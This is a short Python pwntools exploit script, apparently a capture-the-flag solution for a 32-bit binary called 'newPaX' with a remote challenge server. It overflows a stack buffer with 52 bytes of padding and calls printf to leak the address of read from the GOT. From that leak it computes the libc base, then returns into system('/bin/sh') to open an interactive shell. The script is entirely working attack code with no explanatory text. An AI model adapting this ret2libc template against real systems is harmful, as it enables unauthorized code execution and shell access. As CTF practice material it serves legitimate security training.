#!/usr/bin/env python3

from pwn import *

_FILE = "./newPaX"

context.arch = 'i386'

binary = context.binary = ELF(_FILE, checksec=False)

env = {}

_LIBC = binary.libc

if args.GDB:
    p = gdb.debug(_FILE, gdbscript="\n\nc\n", env=env)
elif args.REMOTE:
    p = remote("newpax.darkarmy.xyz", 5001)
    _LIBC = ELF("libc6-i386_2.27-3ubuntu1.2_amd64.so", checksec=False)

else:
    p = process(_FILE, env=env)

#rop = ROP(binary)

#pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]

p.clean()

payload = cyclic(52, n=4)

payload += p32(binary.sym["printf"])

payload += p32(binary.sym["vuln"])

payload += p32(binary.got["read"])


p.sendline(payload)

print(p.clean())

read_addr = u32(p.clean()[:4])

log.info(f"read address: {hex(read_addr)}")

_LIBC.address = read_addr - _LIBC.sym["read"]

payload = cyclic(52, n=4)

payload += p32(_LIBC.sym["system"])

payload += p32(binary.sym["main"])

payload += p32(next(_LIBC.search(b"/bin/sh")))

p.sendline(payload)

p.interactive()

